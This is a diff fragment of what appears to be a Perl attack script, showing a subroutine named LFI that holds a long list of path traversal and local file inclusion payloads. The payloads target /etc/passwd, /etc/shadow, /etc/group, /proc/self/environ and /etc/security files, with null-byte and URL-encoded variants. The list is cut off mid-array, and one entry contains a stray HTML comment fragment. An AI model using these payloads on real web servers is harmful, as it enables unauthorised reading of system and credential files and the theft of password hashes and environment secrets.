@@ -203,7 +203,6 @@ if (!@ARGV) {
 }  
 
 ###################################################################		
-###################################################################		
 
 sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../..